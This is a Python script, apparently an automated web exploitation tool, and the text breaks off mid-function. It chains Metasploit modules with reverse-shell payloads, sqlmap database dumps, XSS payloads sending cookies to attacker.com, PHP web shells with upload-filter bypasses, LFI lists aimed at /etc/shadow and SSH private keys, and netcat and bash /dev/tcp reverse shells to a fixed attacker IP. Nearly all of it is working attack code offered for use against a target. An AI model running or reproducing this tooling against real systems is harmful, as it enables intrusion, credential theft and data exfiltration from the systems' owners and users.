#!/usr/bin/env python3
import json
import subprocess
import requests
import argparse
import time
import re
import base64
import urllib.parse
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import urllib3
import logging
import shutil
import os
from bs4 import BeautifulSoup

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Disable SSL warnings for requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_http_exploit.json"
EXPLOIT_MD = "{target}_http_exploit.md"

def run_command(cmd: List[str], timeout: int = None, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status. No timeout for exploitation."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), result.returncode == 0
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.warning(f"Command timed out but continuing: {cmd_str}")
        return "Command timed out but continuing", True  # Continue anyway
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module with proper payload selection."""
    logger.info(f"Testing Metasploit module: {module}")
    
    # Select appropriate payload based on module type
    if "http" in module.lower() or "web" in module.lower():
        if "windows" in module.lower():
            payload = "windows/shell_reverse_tcp"
        else:
            payload = "cmd/unix/reverse_bash"
    elif "linux" in module.lower():
        payload = "cmd/unix/reverse_bash"
    elif "windows" in module.lower():
        payload = "windows/shell_reverse_tcp"
    else:
        payload = "cmd/unix/reverse_bash"
    
    # Build Metasploit command
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    
    output, success = run_command(msf_cmd, timeout=300)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    
    if success and ("Meterpreter session" in output or "Shell session" in output or "Command shell session" in output or "Found shell" in output or "UID:" in output or "Backdoor service has been spawned" in output or "Command shell session 1 opened" in output):
        return True, poc
    return False, poc

def test_sql_injection_with_sqlmap(url: str, parameter: str) -> Tuple[bool, str, str]:
    """Test SQL injection using sqlmap with comprehensive database enumeration."""
    # Ensure URL contains the parameter; if not, append a default value
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if parameter not in query:
        sep = "&" if parsed.query else "?"
        url = f"{url}{sep}{parameter}=1"

    logger.info(f"Testing SQL injection on {url} with parameter {parameter}")

    # Step 1: Basic injection test
    sqlmap_cmd = [
        "sqlmap", "-u", url, "-p", parameter,
        "--batch", "--random-agent", "--level", "1", "--risk", "1",
        "--timeout", "15", "--threads", "1", "--technique=BEUSTQ"
    ]

    output, success = run_command(sqlmap_cmd, timeout=120)
    text = (output or "").lower()
    
    # Check for successful injection
    indicative = [
        "parameter is vulnerable",
        "is injectable",
        "the back-end dbms is",
        "injection point found",
        "vulnerable to"
    ]
    
    if success and any(s in text for s in indicative):
        # Step 2: Database enumeration
        logger.info(f"SQL injection confirmed, enumerating databases...")
        db_cmd = [
            "sqlmap", "-u", url, "-p", parameter,
            "--batch", "--random-agent", "--dbs", "--timeout", "15"
        ]
        db_output, db_success = run_command(db_cmd, timeout=120)
        
        # Step 3: Table enumeration for first database
        tables_cmd = [
            "sqlmap", "-u", url, "-p", parameter,
            "--batch", "--random-agent", "--tables", "--timeout", "15"
        ]
        tables_output, tables_success = run_command(tables_cmd, timeout=120)
        
        # Step 4: Data extraction
        dump_cmd = [
            "sqlmap", "-u", url, "-p", parameter,
            "--batch", "--random-agent", "--dump", "--timeout", "15"
        ]
        dump_output, dump_success = run_command(dump_cmd, timeout=None)
        
        # Compile comprehensive database info
        db_info = "SQL injection vulnerability confirmed\n"
        if db_success:
            db_info += f"Databases found: {db_output}\n"
        if tables_success:
            db_info += f"Tables found: {tables_output}\n"
        if dump_success:
            db_info += f"Data extracted: {dump_output}\n"
        
        poc = f"sqlmap -u '{url}' -p {parameter} --batch --dbs --dump"
        return True, db_info, poc

    return False, "", f"sqlmap -u '{url}' -p {parameter} --batch"

def test_xss_with_payload(url: str, parameter: str) -> Tuple[bool, str, str, Dict]:
    """Test XSS with comprehensive payload testing and risk analysis."""
    logger.info(f"Testing XSS on {url} with parameter {parameter}")
    
    # Comprehensive XSS payloads for different contexts
    xss_payloads = [
        # Basic XSS (Low risk)
        ("<script>alert('XSS')</script>", "Basic script injection"),
        ("<img src=x onerror=alert('XSS')>", "Image error handler"),
        ("<svg onload=alert('XSS')>", "SVG onload handler"),
        
        # Advanced XSS (Medium risk)
        ("javascript:alert('XSS')", "JavaScript protocol"),
        ("'\"<script>alert('XSS')</script>", "Quote breaking"),
        ("<iframe src=javascript:alert('XSS')>", "Iframe injection"),
        ("<body onload=alert('XSS')>", "Body onload"),
        
        # DOM XSS (High risk)
        ("<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", "Cookie theft"),
        ("<script>fetch('http://attacker.com/steal?data='+document.documentElement.outerHTML)</script>", "Page content theft"),
        ("<script>new Image().src='http://attacker.com/steal?data='+document.cookie;</script>", "Image-based exfiltration"),
        
        # Stored XSS (Critical risk)
        ("<script>setInterval(function(){fetch('http://attacker.com/heartbeat')},1000)</script>", "Persistent beacon"),
        ("<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "Obfuscated payload"),
        ("<script>atob('PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=')</script>", "Base64 encoded"),
        
        # Filter bypass attempts (High risk)
        ("<ScRiPt>alert('XSS')</ScRiPt>", "Case variation"),
        ("<script>alert(String.fromCharCode(88,83,83))</script>", "Character encoding"),
        ("<script>alert('XSS'.toLowerCase())</script>", "String manipulation"),
        
        # Event handlers (Medium risk)
        ("<input onfocus=alert('XSS') autofocus>", "Input focus event"),
        ("<select onchange=alert('XSS')><option>1</option></select>", "Select change event"),
        ("<textarea onblur=alert('XSS')></textarea>", "Textarea blur event"),
    ]
    
    successful_payloads = []
    risk_analysis = {
        "low_risk": [],
        "medium_risk": [],
        "high_risk": [],
        "critical_risk": []
    }
    
    for payload, description in xss_payloads:
        try:
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            response = requests.get(test_url, timeout=15, verify=False)
            
            if response.status_code == 200:
                content = response.text
                
                # Check for payload reflection
                if (payload in content or 
                    "alert('XSS')" in content or 
                    "alert(" in content or
                    "javascript:" in content or
                    "<script>" in content):
                    
                    successful_payloads.append({
                        "payload": payload,
                        "description": description,
                        "url": test_url,
                        "reflection": content[:500]  # Limit for storage
                    })
                    
                    # Categorize by risk level
                    if any(risk_term in payload for risk_term in ["attacker.com", "steal", "fetch", "setInterval", "eval", "atob"]):
                        risk_analysis["critical_risk"].append(f"{payload} - {description}")
                    elif any(risk_term in payload for risk_term in ["document.cookie", "document.documentElement", "outerHTML"]):
                        risk_analysis["high_risk"].append(f"{payload} - {description}")
                    elif any(risk_term in payload for risk_term in ["iframe", "javascript:", "onload", "onfocus", "onchange"]):
                        risk_analysis["medium_risk"].append(f"{payload} - {description}")
                    else:
                        risk_analysis["low_risk"].append(f"{payload} - {description}")
                    
        except Exception as e:
            logger.error(f"XSS test failed for {payload}: {e}")
            continue
    
    if successful_payloads:
        # Create comprehensive proof
        proof_summary = f"XSS confirmed with {len(successful_payloads)} successful payloads:\n"
        for payload_info in successful_payloads[:5]:  # Show first 5
            proof_summary += f"- {payload_info['payload']}: {payload_info['description']}\n"
        
        # Risk assessment
        total_risk = sum(len(risks) for risks in risk_analysis.values())
        if risk_analysis["critical_risk"]:
            risk_level = "CRITICAL"
            risk_description = "Data exfiltration and persistent XSS confirmed - complete session compromise"
        elif risk_analysis["high_risk"]:
            risk_level = "HIGH"
            risk_description = "Cookie theft and data exfiltration confirmed"
        elif risk_analysis["medium_risk"]:
            risk_level = "MEDIUM"
            risk_description = "Event handler and DOM manipulation confirmed"
        else:
            risk_level = "LOW"
            risk_description = "Basic script injection confirmed"
        
        poc = f"curl '{url}?{parameter}=<script>alert('XSS')</script>'"
        proof = f"{proof_summary}\nRisk Level: {risk_level}\nRisk Description: {risk_description}\nTotal Payloads Executed: {total_risk}"
        
        return True, proof, poc, {
            "url": url,
            "parameter": parameter,
            "successful_payloads": successful_payloads,
            "risk_analysis": risk_analysis,
            "risk_level": risk_level,
            "risk_description": risk_description
        }
    
    return False, "", f"curl '{url}?{parameter}=<script>alert('XSS')</script>'", {}

def test_file_upload_and_shell(url: str, upload_path: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str, str, Dict]:
    """Test file upload with comprehensive shell testing and risk analysis."""
    logger.info(f"Testing file upload on {url}")
    
    # Comprehensive shell payloads for different scenarios
    shell_payloads = [
        # Basic PHP shells (Low risk)
        ("<?php system($_GET['cmd']); ?>", "Basic PHP shell"),
        ("<?php echo shell_exec($_GET['cmd']); ?>", "Shell exec"),
        ("<?php passthru($_GET['cmd']); ?>", "Passthru"),
        
        # Advanced PHP shells (Medium risk)
        ("<?php eval($_GET['code']); ?>", "PHP eval"),
        ("<?php assert($_GET['code']); ?>", "PHP assert"),
        ("<?php file_get_contents($_GET['file']); ?>", "File inclusion"),
        
        # Reverse shells (High risk)
        (f"<?php system('nc -e /bin/bash {attacker_ip} {attacker_port}'); ?>", "Netcat reverse shell"),
        (f"<?php system('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\"'); ?>", "Bash reverse shell"),
        (f"<?php system('python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{attacker_ip}\\\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\"'); ?>", "Python reverse shell"),
        
        # Web shells (Medium risk)
        ("<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>", "Conditional shell"),
        ("<?php if(isset($_POST['cmd'])){system($_POST['cmd']);} ?>", "POST shell"),
        ("<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>", "REQUEST shell"),
        
        # Obfuscated shells (High risk)
        ("<?php $a=base64_decode('c3lzdGVt');$a($_GET['cmd']); ?>", "Base64 obfuscated"),
        ("<?php $a='system';$a($_GET['cmd']); ?>", "Variable obfuscated"),
        ("<?php ${'_'.$_GET['a']}($_GET['b']); ?>", "Dynamic function call"),
        
        # File upload bypasses (Critical risk)
        ("<?php system($_GET['cmd']); ?>.jpg", "Extension bypass"),
        ("<?php system($_GET['cmd']); ?>.png", "Image extension"),
        ("<?php system($_GET['cmd']); ?>.gif", "GIF extension"),
        ("<?php system($_GET['cmd']); ?>.txt", "Text extension"),
        
        # Advanced bypasses (Critical risk)
        ("GIF89a<?php system($_GET['cmd']); ?>", "GIF header bypass"),
        ("<?php system($_GET['cmd']); ?>\n\n\n", "Newline bypass"),
        ("<?php system($_GET['cmd']); ?>\r\n", "CRLF bypass"),
        
        # Alternative shells (Medium risk)
        ("<?php include($_GET['file']); ?>", "Include shell"),
        ("<?php require($_GET['file']); ?>", "Require shell"),
        ("<?php include_once($_GET['file']); ?>", "Include once shell"),
    ]
    
    successful_uploads = []
    risk_analysis = {
        "low_risk": [],
        "medium_risk": [],
        "high_risk": [],
        "critical_risk": []
    }
    
    for shell_content, description in shell_payloads:
        try:
            # Try different file names and extensions
            file_names = [
                f"shell_{len(successful_uploads)}.php",
                f"shell_{len(successful_uploads)}.jpg",
                f"shell_{len(successful_uploads)}.png",
                f"shell_{len(successful_uploads)}.gif",
                f"shell_{len(successful_uploads)}.txt",
                f"shell_{len(successful_uploads)}.html"
            ]
            
            for file_name in file_names:
                files = {"file": (file_name, shell_content, "application/x-php")}
                
                response = requests.post(url, files=files, timeout=15, verify=False)
                
                if response.status_code == 200:
                    # Try to access the uploaded file
                    base_url = url.replace('/upload.php', '').replace('/upload', '')
                    test_urls = [
                        f"{base_url}/{file_name}?cmd=whoami",
                        f"{base_url}/uploads/{file_name}?cmd=whoami",
                        f"{base_url}/files/{file_name}?cmd=whoami",
                        f"{base_url}/uploaded/{file_name}?cmd=whoami"
                    ]
                    
                    for test_url in test_urls:
                        try:
                            shell_response = requests.get(test_url, timeout=15, verify=False)
                            
                            if shell_response.status_code == 200 and len(shell_response.text) > 0:
                                # Check for command execution
                                if any(indicator in shell_response.text for indicator in [
                                    "root:", "www-data:", "apache:", "bin:", "etc:", "/var/www", "/home",
                                    "uid=", "gid=", "groups=", "whoami", "pwd", "ls"
                                ]):
                                    successful_uploads.append({
                                        "file_name": file_name,
                                        "description": description,
                                        "upload_url": url,
                                        "shell_url": test_url,
                                        "content": shell_response.text[:500]
                                    })
                                    
                                    # Categorize by risk level
                                    if any(risk_term in shell_content for risk_term in [attacker_ip, "reverse", "nc", "bash", "python"]):
                                        risk_analysis["critical_risk"].append(f"{file_name} - {description}")
                                    elif any(risk_term in shell_content for risk_term in ["eval", "assert", "base64_decode", "dynamic"]):
                                        risk_analysis["high_risk"].append(f"{file_name} - {description}")
                                    elif any(risk_term in shell_content for risk_term in ["include", "require", "system", "shell_exec"]):
                                        risk_analysis["medium_risk"].append(f"{file_name} - {description}")
                                    else:
                                        risk_analysis["low_risk"].append(f"{file_name} - {description}")
                                    
                                    break  # Found working shell, move to next payload
                                    
                        except Exception as e:
                            logger.error(f"Shell test failed for {test_url}: {e}")
                            continue
                    
                    if successful_uploads and len(successful_uploads) > 0 and successful_uploads[-1]["file_name"] == file_name:
                        break  # Found working shell, move to next payload
                        
        except Exception as e:
            logger.error(f"File upload test failed for {description}: {e}")
            continue
    
    if successful_uploads:
        # Create comprehensive proof
        proof_summary = f"File upload confirmed with {len(successful_uploads)} successful shells:\n"
        for upload_info in successful_uploads[:5]:  # Show first 5
            proof_summary += f"- {upload_info['file_name']}: {upload_info['description']}\n"
        
        # Risk assessment
        total_risk = sum(len(risks) for risks in risk_analysis.values())
        if risk_analysis["critical_risk"]:
            risk_level = "CRITICAL"
            risk_description = "Reverse shell capabilities confirmed - immediate system compromise"
        elif risk_analysis["high_risk"]:
            risk_level = "HIGH"
            risk_description = "Advanced shell execution and code evaluation confirmed"
        elif risk_analysis["medium_risk"]:
            risk_level = "MEDIUM"
            risk_description = "Basic command execution and file inclusion confirmed"
        else:
            risk_level = "LOW"
            risk_description = "Basic file upload confirmed"
        
        poc = f"curl -X POST '{url}' -F 'file=@shell.php'"
        proof = f"{proof_summary}\nRisk Level: {risk_level}\nRisk Description: {risk_description}\nTotal Shells Uploaded: {total_risk}"
        
        return True, proof, poc, {
            "url": url,
            "successful_uploads": successful_uploads,
            "risk_analysis": risk_analysis,
            "risk_level": risk_level,
            "risk_description": risk_description
        }
    
    return False, "", f"curl -X POST '{url}' -F 'file=@shell.php'", {}

def test_lfi_and_file_download(url: str, parameter: str) -> Tuple[bool, str, str, Dict]:
    """Test LFI with comprehensive file enumeration and risk analysis."""
    logger.info(f"Testing LFI on {url} with parameter {parameter}")
    
    # Comprehensive LFI payloads for different risk levels
    lfi_payloads = [
        # Basic system files (Low risk)
        ("../../../etc/passwd", "User database"),
        ("../../../etc/group", "Group database"),
        ("../../../etc/hosts", "Hosts file"),
        ("../../../etc/resolv.conf", "DNS configuration"),
        
        # Configuration files (Medium risk)
        ("../../../etc/apache2/apache2.conf", "Apache configuration"),
        ("../../../etc/nginx/nginx.conf", "Nginx configuration"),
        ("../../../etc/php/php.ini", "PHP configuration"),
        ("../../../etc/mysql/my.cnf", "MySQL configuration"),
        
        # Web server files (Medium risk)
        ("../../../var/www/index.php", "Web root index"),
        ("../../../var/www/phpinfo.php", "PHP info file"),
        ("../../../var/log/apache2/access.log", "Apache access log"),
        ("../../../var/log/apache2/error.log", "Apache error log"),
        
        # Sensitive files (High risk)
        ("../../../etc/shadow", "Password hashes"),
        ("../../../etc/sudoers", "Sudoers file"),
        ("../../../root/.bash_history", "Root bash history"),
        ("../../../home/*/.bash_history", "User bash history"),
        
        # Application files (High risk)
        ("../../../var/www/html/config.php", "Application config"),
        ("../../../var/www/html/db.php", "Database config"),
        ("../../../var/www/html/admin/config.php", "Admin config"),
        ("../../../var/www/html/includes/config.php", "Include config"),
        
        # Log files (Medium risk)
        ("../../../var/log/auth.log", "Authentication log"),
        ("../../../var/log/syslog", "System log"),
        ("../../../var/log/mail.log", "Mail log"),
        ("../../../var/log/nginx/access.log", "Nginx access log"),
        
        # SSH files (High risk)
        ("../../../etc/ssh/sshd_config", "SSH server config"),
        ("../../../root/.ssh/id_rsa", "Root SSH key"),
        ("../../../home/*/.ssh/id_rsa", "User SSH keys"),
        ("../../../etc/ssh/ssh_host_rsa_key", "SSH host key"),
        
        # Database files (Critical risk)
        ("../../../var/lib/mysql/mysql/user.MYD", "MySQL user table"),
        ("../../../var/lib/mysql/mysql/db.MYD", "MySQL database table"),
        ("../../../var/lib/postgresql/data/pg_hba.conf", "PostgreSQL config"),
        ("../../../var/lib/postgresql/data/postgresql.conf", "PostgreSQL config"),
        
        # PHP session files (High risk)
        ("../../../tmp/sess_*", "PHP session files"),
        ("../../../var/lib/php/sessions/sess_*", "PHP session files"),
        ("../../../tmp/php*", "PHP temporary files"),
        
        # Backup files (Medium risk)
        ("../../../var/www/*.bak", "Backup files"),
        ("../../../var/www/*.backup", "Backup files"),
        ("../../../var/www/*.old", "Old files"),
        ("../../../var/www/*.orig", "Original files"),
    ]
    
    successful_files = []
    risk_analysis = {
        "low_risk": [],
        "medium_risk": [],
        "high_risk": [],
        "critical_risk": []
    }
    
    for payload, description in lfi_payloads:
        try:
            lfi_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            response = requests.get(lfi_url, timeout=15, verify=False)
            
            if response.status_code == 200 and len(response.text) > 50:
                content = response.text
                
                # Check for successful file inclusion
                if any(indicator in content for indicator in [
                    # System file indicators
                    "root:", "bin:", "daemon:", "sys:", "adm:",
                    # Configuration indicators
                    "ServerRoot", "DocumentRoot", "DirectoryIndex",
                    # Log indicators
                    "GET", "POST", "HTTP/1.1", "200 OK", "404 Not Found",
                    # Database indicators
                    "mysql", "postgresql", "database", "table",
                    # SSH indicators
                    "ssh-rsa", "ssh-dss", "ecdsa-sha2",
                    # PHP indicators
                    "<?php", "session_start", "mysql_connect",
                    # Web indicators
                    "<html", "<head", "<body", "DOCTYPE"
                ]):
                    successful_files.append({
                        "payload": payload,
                        "description": description,
                        "url": lfi_url,
                        "content": content[:1000]  # Limit for storage
                    })
                    
                    # Categorize by risk level
                    if any(risk_term in payload for risk_term in ["shadow", "mysql", "postgresql", "sess_", "ssh"]):
                        risk_analysis["critical_risk"].append(f"{payload} - {description}")
                    elif any(risk_term in payload for risk_term in ["sudoers", "bash_history", "config.php", "db.php"]):
                        risk_analysis["high_risk"].append(f"{payload} - {description}")
                    elif any(risk_term in payload for risk_term in ["apache2.conf", "nginx.conf", "php.ini", "log"]):
                        risk_analysis["medium_risk"].append(f"{payload} - {description}")
                    else:
                        risk_analysis["low_risk"].append(f"{payload} - {description}")
                    
        except Exception as e:
            logger.error(f"LFI test failed for {payload}: {e}")
            continue
    
    if successful_files:
        # Create comprehensive proof
        proof_summary = f"LFI confirmed with {len(successful_files)} successful file inclusions:\n"
        for file_info in successful_files[:5]:  # Show first 5
            proof_summary += f"- {file_info['payload']}: {file_info['description']}\n"
        
        # Risk assessment
        total_risk = sum(len(risks) for risks in risk_analysis.values())
        if risk_analysis["critical_risk"]:
            risk_level = "CRITICAL"
            risk_description = "Password hashes, database files, and SSH keys accessible - complete system compromise"
        elif risk_analysis["high_risk"]:
            risk_level = "HIGH"
            risk_description = "Configuration files and sensitive data accessible"
        elif risk_analysis["medium_risk"]:
            risk_level = "MEDIUM"
            risk_description = "Log files and configuration information accessible"
        else:
            risk_level = "LOW"
            risk_description = "Basic system files accessible"
        
        poc = f"curl '{url}?{parameter}=../../../etc/passwd'"
        proof = f"{proof_summary}\nRisk Level: {risk_level}\nRisk Description: {risk_description}\nTotal Files Accessed: {total_risk}"
        
        return True, proof, poc, {
            "url": url,
            "parameter": parameter,
            "successful_files": successful_files,
            "risk_analysis": risk_analysis,
            "risk_level": risk_level,
            "risk_description": risk_description
        }
    
    return False, "", f"curl '{url}?{parameter}=../../../etc/passwd'", {}

def test_rce_and_proof(url: str, parameter: str) -> Tuple[bool, str, str, Dict]:
    """Test RCE and provide comprehensive proof of execution with risk analysis."""
    logger.info(f"Testing RCE on {url} with parameter {parameter}")
    
    # Comprehensive command testing for different risk levels
    test_commands = [
        # Basic system info (Low risk)
        ("whoami", "User identification"),
        ("id", "User and group information"),
        ("uname -a", "System information"),
        ("pwd", "Current directory"),
        ("ls -la", "Directory listing"),
        
        # System enumeration (Medium risk)
        ("cat /etc/passwd", "User database"),
        ("cat /etc/group", "Group database"),
        ("ps aux", "Process list"),
        ("netstat -tuln", "Network connections"),
        ("df -h", "Disk usage"),
        
        # Privilege escalation checks (High risk)
        ("sudo -l", "Sudo privileges"),
        ("find / -perm -4000 2>/dev/null", "SUID binaries"),
        ("find / -perm -2000 2>/dev/null", "SGID binaries"),
        ("cat /etc/sudoers", "Sudoers file"),
        
        # Network and service enumeration (High risk)
        ("cat /etc/hosts", "Hosts file"),
        ("cat /etc/resolv.conf", "DNS configuration"),
        ("iptables -L", "Firewall rules"),
        ("ss -tuln", "Socket statistics"),
        
        # Web server enumeration (Medium risk)
        ("ls -la /var/www", "Web root"),
        ("cat /var/www/phpinfo.php", "PHP info file"),
        ("find /var/www -name '*.php' -exec grep -l 'password\\|passwd\\|admin' {} \\;", "Sensitive files"),
        
        # Database enumeration (High risk)
        ("mysql -u root -p -e 'SHOW DATABASES;'", "MySQL databases"),
        ("psql -U postgres -c '\\l'", "PostgreSQL databases"),
        
        # File system exploration (Medium risk)
        ("find /home -name '*.txt' -o -name '*.conf' -o -name '*.log'", "User files"),
        ("find /etc -name '*.conf' | head -10", "Configuration files"),
        
        # Reverse shell test (Critical risk)
        ("nc -e /bin/bash 192.168.1.16 4444", "Reverse shell attempt"),
        ("bash -c 'bash -i >& /dev/tcp/192.168.1.16/4444 0>&1'", "Bash reverse shell"),
    ]
    
    successful_commands = []
    risk_analysis = {
        "low_risk": [],
        "medium_risk": [],
        "high_risk": [],
        "critical_risk": []
    }
    
    for cmd, description in test_commands:
        try:
            test_url = f"{url}?{parameter}={urllib.parse.quote(cmd)}"
            response = requests.get(test_url, timeout=15, verify=False)
            
            if response.status_code == 200:
                content = response.text
                
                # Strict proof: require known execution markers to avoid html-only false positives
                indicators = [
                    # User/system indicators
                    "uid=", "gid=", "whoami", "root:", "/var/www", "/home",
                    # Process indicators
                    " PID ", " CMD ",
                    # Filesystem listing markers
                    "drwx", "-rw", " total ",
                ]
                if any(ind in content for ind in indicators):
                    successful_commands.append({
                        "command": cmd,
                        "description": description,
                        "output": content[:1000],  # Limit output for storage
                        "url": test_url
                    })
                    
                    # Categorize by risk level
                    if any(risk_cmd in cmd for risk_cmd in ["nc", "bash", "reverse", "shell"]):
                        risk_analysis["critical_risk"].append(f"{cmd} - {description}")
                    elif any(risk_cmd in cmd for risk_cmd in ["sudo", "passwd", "mysql", "psql", "iptables"]):
                        risk_analysis["high_risk"].append(f"{cmd} - {description}")
                    elif any(risk_cmd in cmd for risk_cmd in ["ps", "netstat", "ss", "find"]):
                        risk_analysis["medium_risk"].append(f"{cmd} - {description}")
                    else:
                        risk_analysis["low_risk"].append(f"{cmd} - {description}")
                    
        except Exception as e:
            logger.error(f"RCE test failed for {cmd}: {e}")
            continue
    
    if successful_commands:
        # Create comprehensive proof
        proof_summary = f"RCE confirmed with {len(successful_commands)} successful commands:\n"
        for cmd_info in successful_commands[:5]:  # Show first 5
            proof_summary += f"- {cmd_info['command']}: {cmd_info['description']}\n"
        
        # Risk assessment
        total_risk = sum(len(risks) for risks in risk_analysis.values())
        if risk_analysis["critical_risk"]:
            risk_level = "CRITICAL"
            risk_description = "Reverse shell capabilities confirmed - immediate compromise possible"
        elif risk_analysis["high_risk"]:
            risk_level = "HIGH"
            risk_description = "Privilege escalation and database access confirmed"
        elif risk_analysis["medium_risk"]:
            risk_level = "MEDIUM"
            risk_description = "System enumeration and information disclosure confirmed"
        else:
            risk_level = "LOW"
            risk_description = "Basic command execution confirmed"
        
        poc = f"curl '{url}?{parameter}=whoami'"
        proof = f"{proof_summary}\nRisk Level: {risk_level}\nRisk Description: {risk_description}\nTotal Commands Executed: {total_risk}"
        
        return True, proof, poc, {
            "url": url,
            "parameter": parameter,
            "successful_commands": successful_commands,
            "risk_analysis": risk_analysis,
            "risk_level": risk_level,
            "risk_description": risk_description
        }
    
    return False, "", f"curl '{url}?{parameter}=whoami'", {}

def test_metasploit_http_exploits(target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Test Metasploit HTTP exploits."""
    exploits = []
    
    # Common HTTP exploit modules
    # Align with common msf6 module names; filter out non-existent ones dynamically later
    http_modules = [
        # PHP CGI arg injection (older name may not exist on all installs)
        "exploit/multi/http/php_cgi_arg_injection",
        # Generic PHP include file disclosure/RCE paths
        "exploit/unix/webapp/php_include",
        # Common Apache/PHP cgi related modules
        "exploit/linux/http/apache_mod_cgi_bash_env_exec",  # shellshock as example
    ]
    
    for module in http_modules:
        logger.info(f"Testing Metasploit module: {module}")
        success, poc = run_metasploit_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
        
        if success:
            exploits.append({
                "type": f"Metasploit {module.split('/')[-1]}",
                "target": f"{target}:{port}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })
    
    return exploits

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str, use_rockyou: bool) -> List[Dict]:
    """Actually exploit the target using reconnaissance data and prove access."""
    exploits: List[Dict] = []
    base_url = f"http://{target}:{port}"

    logger.info(f"Starting exploitation of {base_url} using reconnaissance data")

    vulnerable_endpoints = metadata.get("vulnerable_endpoints", {})
    discovered_endpoints = metadata.get("discovered_endpoints", [])
    misconfigurations = metadata.get("misconfigurations", [])
    outdated_software = metadata.get("outdated_software", [])
    os_exploit_mods = metadata.get("os_exploit_mods", [])
    os_exploit_cves = metadata.get("os_exploit_cves", [])
    wayback_urls = metadata.get("wayback_urls", [])
    vhosts = metadata.get("vhosts", [])
    dns_records = metadata.get("dns_records", [])

    max_tests_per_type = 3

    # If reconnaissance discovered full URLs, prefer the first origin (scheme://host[:port])
    # to avoid port mismatches (e.g., recon on :80 while we defaulted to :8180)
    try:
        if discovered_endpoints:
            from urllib.parse import urlparse
            first_url = discovered_endpoints[0].get("url", "")
            parsed = urlparse(first_url)
            if parsed.scheme and parsed.netloc:
                derived_base = f"{parsed.scheme}://{parsed.netloc}"
                if derived_base != base_url:
                    logger.info(f"Adjusting base URL from {base_url} to {derived_base} based on recon endpoints")
                    base_url = derived_base
                # Derive port for Metasploit/web usage if not explicitly provided in metadata
                derived_port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
                if str(derived_port) != str(port):
                    logger.info(f"Adjusting port from {port} to {derived_port} based on recon endpoints")
                    port = str(derived_port)
    except Exception:
        pass

    # Utility to persist proof artifacts to disk per exploit
    def persist_proof(prefix: str, data: Dict) -> str:
        try:
            OUTPUT_DIR.mkdir(exist_ok=True)
            safe_prefix = prefix.replace("/", "_")
            proof_path = OUTPUT_DIR / f"{target}_http_{safe_prefix}_proof.txt"
            content = data.get("content", "")
            with proof_path.open("w", encoding="utf-8") as pf:
                pf.write(content if isinstance(content, str) else str(content))
            return str(proof_path)
        except Exception:
            return ""

    # 1) SQL Injection - Login Form Detection
    logger.info("Testing login forms for SQL injection")
    success, proof, poc, evidence = test_login_form_sql_injection(base_url, target)
    if success:
        proof_file = persist_proof("login_sql", evidence)
        exploits.append({
            "type": "SQL Injection - Login Form",
            "target": f"{target}:{port}",
            "details": f"SQL injection found in login form: {proof}",
            "poc": poc,
            "proof": proof,
            "proof_file": proof_file
        })
    
    # 2) SQL Injection - Reconnaissance Endpoints
    sql_endpoints = vulnerable_endpoints.get("sql_injection", [])
    sql_found = False
    for endpoint in sql_endpoints[:max_tests_per_type]:
        success, db_info, poc = test_sql_injection_with_sqlmap(endpoint.get("url", base_url), endpoint.get("parameter", "id"))
        if success:
            exploits.append({
                "type": "SQL Injection",
                "target": f"{target}:{port}",
                "details": f"SQL injection found and exploited on {endpoint.get('url', base_url)}: {db_info}",
                "poc": poc,
                "proof": f"Database accessed: {db_info}",
                "proof_file": ""
            })
            sql_found = True
            break
    if not sql_found:
        logger.info("No SQL injection endpoints found in recon (or none successful), testing generic endpoints")
        for url in [f"{base_url}/index.php?id={{id}}", f"{base_url}/page.php?id={{id}}"][:max_tests_per_type]:
            success, db_info, poc = test_sql_injection_with_sqlmap(url, "id")
            if success:
                exploits.append({
                    "type": "SQL Injection",
                    "target": f"{target}:{port}",
                    "details": f"SQL injection found and exploited: {db_info}",
                    "poc": poc,
                    "proof": f"Database accessed: {db_info}",
                    "proof_file": ""
                })
                break

    # 2) XSS
    xss_endpoints = vulnerable_endpoints.get("xss", [])
    xss_found = False
